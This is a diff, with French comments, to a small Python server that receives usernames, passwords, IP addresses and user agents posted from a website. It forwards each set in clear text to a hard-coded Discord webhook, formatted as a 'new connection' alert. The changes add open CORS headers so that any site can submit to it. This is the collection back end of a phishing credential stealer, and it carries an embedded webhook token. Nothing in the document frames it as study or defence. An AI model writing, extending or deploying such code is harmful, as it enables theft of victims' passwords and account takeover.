@@ -3,10 +3,21 @@ import json
 import datetime
 import urllib.request
 
-# Remplace par ton URL de webhook valide
+# Remplace par ton URL de webhook Discord valide
 WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
 class MyHandler(SimpleHTTPRequestHandler):
+    def end_headers(self):
+        # Ajout des en-têtes CORS pour autoriser les requêtes du site web
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        super().end_headers()
+
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.end_headers()
+
     def do_POST(self):
         if self.path == '/register':
             try:
@@ -14,24 +25,22 @@ class MyHandler(SimpleHTTPRequestHandler):
                 post_data = self.rfile.read(content_length)
                 data = json.loads(post_data.decode('utf-8'))
 
-                # Horodatage
                 now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                 
-                # Extraction sécurisée des données avec valeurs par défaut
                 username = data.get('username', 'Inconnu')
                 password = data.get('password', 'Inconnu')
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[+] Nouvelles données reçues pour : {username}")
+                print(f"[+] Données reçues - Utilisateur: {username}")
 
-                # Construction du message Discord
+                # Construction du message pour Discord
                 msg = (
-                    f"--- NOUVELLE CONNEXION [{now}] ---\n"
-                    f"Utilisateur : {username}\n"
-                    f"Mot de passe : {password}\n"
-                    f"Adresse IP : {ip_addr}\n"
-                    f"User-Agent : {user_agent}"
+                    f"🚨 **NOUVELLE CONNEXION** [{now}] 🚨\n"
+                    f"👤 **Utilisateur :** {username}\n"
+                    f"🔑 **Mot de passe :** {password}\n"
+                    f"🌐 **Adresse IP :** {ip_addr}\n"
+                    f"💻 **User-Agent :** {user_agent}"
                 )
 
                 payload = json.dumps({"content": msg}).encode('utf-8')
@@ -43,14 +52,13 @@ class MyHandler(SimpleHTTPRequestHandler):
 
                 urllib.request.urlopen(req)
 
-                # Réponse HTTP de succès au client
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"Erreur lors du traitement : {e}")
+                print(f"[-] Erreur serveur : {e}")
                 self.send_response(500)
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
@@ -60,5 +68,5 @@ class MyHandler(SimpleHTTPRequestHandler):
 if __name__ == '__main__':
     server_address = ('', 8000)
     httpd = HTTPServer(server_address, MyHandler)
-    print("Serveur démarré sur le port 8000...")
+    print("Serveur Python démarré sur le port 8000...")
     httpd.serve_forever()
